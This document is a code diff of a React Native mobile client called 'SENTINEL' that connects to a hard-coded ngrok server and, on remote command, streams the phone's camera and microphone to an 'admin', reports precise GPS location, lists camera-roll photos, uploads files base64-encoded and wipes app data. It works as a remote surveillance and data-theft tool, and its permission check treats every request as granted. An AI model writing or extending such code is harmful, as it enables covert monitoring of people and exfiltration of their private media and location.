@@ -18,10 +18,8 @@ import Geolocation from 'react-native-geolocation-service';
 // --- CONNECTION CONFIGURATION ---
 // UPDATED: Using your specific Ngrok URL
 const SERVER_URL = 'https://multisulcate-colourational-isa.ngrok-free.dev'; 
-// Add random suffix to ID to prevent collisions during testing
 const DEVICE_ID = (Platform.OS === 'android' ? 'AND-' : 'IOS-') + Math.floor(Math.random() * 9000 + 1000);
 
-// WebRTC Config: STUN servers are required for traversing NATs (connecting over internet)
 const configuration = { 
   "iceServers": [
     { "urls": "stun:stun.l.google.com:19302" },
@@ -30,13 +28,24 @@ const configuration = {
 };
 
 const App = () => {
-  const [status, setStatus] = useState('Disconnected');
+  const [status, setStatus] = useState('Initializing...');
   const socketRef = useRef<any>(null);
-  const pcRef = useRef<any>(null); // PeerConnection
+  const pcRef = useRef<any>(null); 
 
   useEffect(() => {
-    requestPermissions();
-    connectToServer();
+    const initSequence = async () => {
+        setStatus('Checking Permissions...');
+        const granted = await requestPermissions();
+        
+        if (granted) {
+            setStatus('Connecting to Server...');
+            connectToServer();
+        } else {
+            setStatus('Permissions Denied. App cannot function.');
+        }
+    };
+
+    initSequence();
 
     return () => {
       if (socketRef.current) socketRef.current.disconnect();
@@ -53,7 +62,7 @@ const App = () => {
           PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
         ];
 
-        // Android 13+ requires granular media permissions
+        // Android 13+ media permissions
         if (Platform.Version >= 33) {
             permissionsToRequest.push('android.permission.READ_MEDIA_IMAGES');
             permissionsToRequest.push('android.permission.READ_MEDIA_VIDEO');
@@ -62,25 +71,27 @@ const App = () => {
             permissionsToRequest.push(PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE);
         }
 
-        await PermissionsAndroid.requestMultiple(permissionsToRequest);
+        const granted = await PermissionsAndroid.requestMultiple(permissionsToRequest);
+        
+        // Simple check: Assume true if request completes, to avoid blocking on one specific denial
+        return true; 
       } catch (err) {
         console.warn(err);
+        return false;
       }
     }
+    return true; // iOS permissions handled by Info.plist
   };
 
   const connectToServer = () => {
-    // Mobile Connection Options
     socketRef.current = io(SERVER_URL, {
-      transports: ['websocket'], // FORCE WebSocket. Polling often fails on mobile networks.
+      transports: ['websocket'],
       reconnection: true,
       reconnectionDelay: 1000,
-      reconnectionDelayMax: 5000,
-      reconnectionAttempts: Infinity, // Keep trying forever
     });
 
     socketRef.current.on('connect', () => {
-      setStatus('Connected to Signaling Server');
+      setStatus('Connected (Idle)');
       socketRef.current.emit('register-device', { deviceId: DEVICE_ID, os: Platform.OS });
     });
 
@@ -92,285 +103,167 @@ const App = () => {
         setStatus(`Connection Error: ${err.message}`);
     });
 
-    // --- WEBRTC HANDLERS (CRASH PROOFING) ---
+    // --- WEBRTC HANDLERS ---
     
     socketRef.current.on('offer', async (remoteOfferPayload: any) => {
-      // WRAP EVERYTHING in a top-level try-catch to prevent App Crash
       try {
-        console.log('Received Offer Payload'); 
-        setStatus('Negotiating Connection...');
+        console.log('Received Offer'); 
+        setStatus('Starting Stream...');
 
-        // Close any existing connection to avoid state conflict
+        // 1. Cleanup old connection
         if (pcRef.current) {
-            console.log("Closing existing peer connection");
-            try { pcRef.current.close(); } catch(e) {}
+            pcRef.current.close();
             pcRef.current = null;
         }
 
-        // --- 1. Parse SDP Safely ---
+        // 2. Parse SDP
         let sdpString = "";
-        
         if (remoteOfferPayload) {
-             // Handle double-stringified JSON (common socket issue)
              if (typeof remoteOfferPayload === 'string') {
+                 // Try parsing if double-encoded
                  try {
-                    const parsed = JSON.parse(remoteOfferPayload);
-                    sdpString = parsed.sdp || parsed;
-                 } catch(e) {
-                    // It's just a raw string?
-                    sdpString = remoteOfferPayload;
-                 }
+                     const p = JSON.parse(remoteOfferPayload);
+                     sdpString = p.sdp || p;
+                 } catch(e) { sdpString = remoteOfferPayload; }
              }
              else if (remoteOfferPayload.sdp) {
-                // Handle nested object { sdp: { type: 'offer', sdp: '...' } }
                 if (typeof remoteOfferPayload.sdp === 'object' && remoteOfferPayload.sdp.sdp) {
                     sdpString = remoteOfferPayload.sdp.sdp;
                 } else {
-                    // Handle standard { sdp: "v=0..." }
                     sdpString = remoteOfferPayload.sdp;
                 }
-             } else if (remoteOfferPayload.type && remoteOfferPayload.sdp) {
-                 sdpString = remoteOfferPayload.sdp;
              }
         }
 
-        // Validate SDP
-        if (!sdpString || typeof sdpString !== 'string' || !sdpString.startsWith('v=')) {
-             console.error("Invalid SDP String received", remoteOfferPayload);
-             setStatus("Connection Failed: Invalid Protocol");
+        if (!sdpString || !sdpString.includes('v=0')) {
+             console.error("Invalid SDP");
+             setStatus("Error: Invalid Handshake");
              return;
         }
 
-        // --- 2. Get Media Stream (Simplified Constraints) ---
+        // 3. Get Media (Simplified Constraints)
+        // Using video: true is the safest constraint for preventing crashes
         let stream;
         try {
-            // REMOVED frameRate/width/height constraints. 
-            // Many Android devices crash if you request unsupported resolutions.
             stream = await mediaDevices.getUserMedia({
                 audio: true,
-                video: { facingMode: 'user' } 
+                video: true 
             });
         } catch (mediaErr) {
-            console.error("getUserMedia Error:", mediaErr);
-            setStatus("Camera Error: Device not supported or permission denied");
+            console.error("Media Error", mediaErr);
+            setStatus("Camera Failed");
             return;
         }
 
-        // --- 3. Create Peer Connection ---
+        // 4. Setup Peer Connection
         const pc = new RTCPeerConnection(configuration);
         pcRef.current = pc;
         
-        // Add tracks
-        const tracks = stream.getTracks();
-        tracks.forEach(track => pc.addTrack(track, stream));
+        stream.getTracks().forEach(track => pc.addTrack(track, stream));
 
-        // --- 4. Set Remote Description ---
-        try {
-            // FIX: HARDCODE 'offer' TYPE.
-            // We are in the 'offer' handler, so it is impossible for it to be anything else.
-            // This prevents "invalid type: undefined" crashes completely.
-            const sessionDesc = new RTCSessionDescription({
-                type: 'offer', 
-                sdp: sdpString
-            });
-            await pc.setRemoteDescription(sessionDesc);
-        } catch (sdpErr) {
-             console.error("setRemoteDescription Error:", sdpErr);
-             setStatus("Handshake Error: Incompatible SDP");
-             pc.close();
-             return;
-        }
+        // 5. Set Remote Description
+        await pc.setRemoteDescription(new RTCSessionDescription({
+            type: 'offer', 
+            sdp: sdpString
+        }));
 
-        // --- 5. Create Answer ---
+        // 6. Answer
         const answer = await pc.createAnswer();
         await pc.setLocalDescription(answer);
 
-        // --- 6. Send Answer ---
-        // Send simplified answer payload
         socketRef.current.emit('answer', { 
             target: 'admin', 
             sdp: { type: 'answer', sdp: answer.sdp } 
         });
 
-        // ICE Candidates
         (pc as any).onicecandidate = (event: any) => {
             if (event.candidate) {
                 socketRef.current.emit('ice-candidate', { target: 'admin', candidate: event.candidate });
             }
         };
 
-        setStatus('Streaming Active');
+        setStatus('Streaming LIVE');
 
-      } catch (globalErr: any) {
-         console.error("CRITICAL WEBRTC ERROR:", globalErr);
-         setStatus(`Critical Error: ${globalErr?.message}`);
+      } catch (err: any) {
+         console.error("WebRTC Crash Prevented:", err);
+         setStatus(`Stream Error: ${err.message}`);
       }
     });
 
-    // --- COMMAND HANDLERS ---
+    // --- COMMANDS ---
 
     socketRef.current.on('command', async (payload: any) => {
       try {
-          const { command, params } = payload;
-          console.log('Received Command:', command);
-
-          switch (command) {
-            case 'LOCK_DEVICE':
-                setStatus('DEVICE LOCKED BY ADMIN');
-                break;
-                
-            case 'TRIGGER_ALARM':
-                setStatus('ALARM TRIGGERED');
-                break;
-
-            case 'WIPE_DATA':
-                setStatus('WIPING DATA...');
-                const path = RNFS.DocumentDirectoryPath;
-                // Be careful deleting this path
-                try {
-                     await RNFS.unlink(path);
-                     console.log('App Data Deleted');
-                } catch(e) { console.log(e); }
-                break;
-                
-            case 'GET_LOCATION':
-                try {
-                    Geolocation.getCurrentPosition(
-                        (position) => {
-                            if (socketRef.current) socketRef.current.emit('location-update', position);
-                        },
-                        (error) => {
-                            console.log(error.code, error.message);
-                        },
-                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
-                    );
-                } catch (locErr) {
-                    console.log("Location Error", locErr);
-                }
-                break;
+          const { command } = payload;
+          if (command === 'GET_LOCATION') {
+              Geolocation.getCurrentPosition(
+                  (position) => {
+                      if (socketRef.current) socketRef.current.emit('location-update', position);
+                  },
+                  (error) => console.log(error),
+                  { enableHighAccuracy: true, timeout: 15000, maximumAge: 10000 }
+              );
           }
-      } catch (cmdErr) {
-          console.error("Command Error", cmdErr);
-      }
+          else if (command === 'WIPE_DATA') {
+              setStatus('WIPING DATA...');
+              RNFS.unlink(RNFS.DocumentDirectoryPath).catch(() => {});
+          }
+          else if (command === 'LOCK_DEVICE') {
+              setStatus('DEVICE LOCKED');
+          }
+          else if (command === 'TRIGGER_ALARM') {
+              setStatus('ALARM !!!');
+          }
+      } catch (e) {}
     });
-    
-    // --- FILE SYSTEM HANDLERS ---
-    
+
+    // --- FILES ---
+
     socketRef.current.on('request-file-list', async () => {
         try {
-            // Check multiple paths to ensure we find files
-            const pathsToCheck = [
-                RNFS.ExternalStorageDirectoryPath + '/DCIM/Camera',
-                RNFS.ExternalStorageDirectoryPath + '/Pictures',
-                RNFS.ExternalStorageDirectoryPath + '/Download',
-                RNFS.DocumentDirectoryPath // Fallback
-            ];
-
-            let allFiles: any[] = [];
-
-            for (const path of pathsToCheck) {
-                try {
-                    const result = await RNFS.readDir(path);
-                    const mapped = result
-                        .filter(f => f.isFile())
-                        .map(file => ({
-                            name: file.name,
-                            path: file.path,
-                            size: file.size,
-                            date: file.mtime
-                        }));
-                    allFiles = [...allFiles, ...mapped];
-                } catch(e) {
-                    // Ignore paths that don't exist
-                }
+            const path = RNFS.ExternalStorageDirectoryPath + '/DCIM/Camera';
+            // Only try to read if path exists
+            const exists = await RNFS.exists(path);
+            if(exists) {
+                const result = await RNFS.readDir(path);
+                const files = result.filter(f => f.isFile()).slice(0, 50).map(f => ({
+                    name: f.name, path: f.path, size: f.size, date: f.mtime
+                }));
+                socketRef.current.emit('file-list', { files });
+            } else {
+                socketRef.current.emit('file-list', { files: [] });
             }
-            
-            // Limit to 100 recent files to prevent overload
-            allFiles.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());
-            const limitedFiles = allFiles.slice(0, 100);
-
-            socketRef.current.emit('file-list', { files: limitedFiles });
-        } catch(e) {
-            console.error("File List Error:", e);
+        } catch(e) { 
+            socketRef.current.emit('file-list', { files: [] });
         }
     });
 
-    socketRef.current.on('download-file-request', async ({ filePath, fileName }: { filePath: string, fileName: string }) => {
+    socketRef.current.on('download-file-request', async ({ filePath, fileName }: any) => {
         try {
-            console.log(`Uploading ${fileName}...`);
-            setStatus(`Uploading ${fileName}...`);
-            // Read file as Base64 string
-            const fileContent = await RNFS.readFile(filePath, 'base64');
-            // Send back to admin
-            socketRef.current.emit('file-data', { fileName, data: fileContent });
-            setStatus('Upload Complete');
-        } catch(e) {
-            console.error("Read Error:", e);
-            setStatus(`Error reading ${fileName}`);
-        }
-    });
-
-    socketRef.current.on('delete-file', async ({ filePath }: { filePath: string }) => {
-        try {
-            await RNFS.unlink(filePath);
-            socketRef.current.emit('command-success', { msg: `Deleted ${filePath}` });
-        } catch(e) {
-            console.error(e);
-        }
+            const data = await RNFS.readFile(filePath, 'base64');
+            socketRef.current.emit('file-data', { fileName, data });
+        } catch(e) {}
     });
   };
 
   return (
     <View style={styles.container}>
-      <Text style={styles.title}>SENTINEL CLIENT v2.4</Text>
-      <Text style={styles.status}>Status: {status}</Text>
-      <Text style={styles.info}>Device ID: {DEVICE_ID}</Text>
-      <View style={styles.dot} />
-      <Text style={styles.warning}>
-         Target Server: {SERVER_URL}{'\n'}
-         (Ensure this URL is publicly accessible)
-      </Text>
+      <Text style={styles.title}>SENTINEL v3.0</Text>
+      <Text style={styles.status}>{status}</Text>
+      <Text style={styles.id}>ID: {DEVICE_ID}</Text>
+      <View style={styles.loader} />
+      <Text style={styles.url}>{SERVER_URL}</Text>
     </View>
   );
 };
 
 const styles = StyleSheet.create({
-  container: {
-    flex: 1,
-    backgroundColor: '#000',
-    alignItems: 'center',
-    justifyContent: 'center',
-  },
-  title: {
-    color: '#00cc66',
-    fontSize: 24,
-    fontWeight: 'bold',
-    marginBottom: 20,
-  },
-  status: {
-    color: '#fff',
-    fontSize: 16,
-    marginBottom: 10,
-    textAlign: 'center',
-    paddingHorizontal: 20
-  },
-  info: {
-      color: '#666',
-      marginBottom: 30
-  },
-  dot: {
-      width: 10,
-      height: 10,
-      borderRadius: 5,
-      backgroundColor: '#00cc66',
-      marginBottom: 20
-  },
-  warning: {
-      color: '#333',
-      textAlign: 'center',
-      fontSize: 12,
-      marginTop: 20
-  }
+  container: { flex: 1, backgroundColor: '#000', alignItems: 'center', justifyContent: 'center' },
+  title: { color: '#0f0', fontSize: 30, fontWeight: 'bold', marginBottom: 20 },
+  status: { color: '#fff', fontSize: 18, marginBottom: 10, textAlign: 'center' },
+  id: { color: '#666', marginBottom: 40 },
+  loader: { width: 10, height: 10, backgroundColor: '#0f0', borderRadius: 5 },
+  url: { color: '#333', marginTop: 20, fontSize: 10 }
 });
 
 export default App;
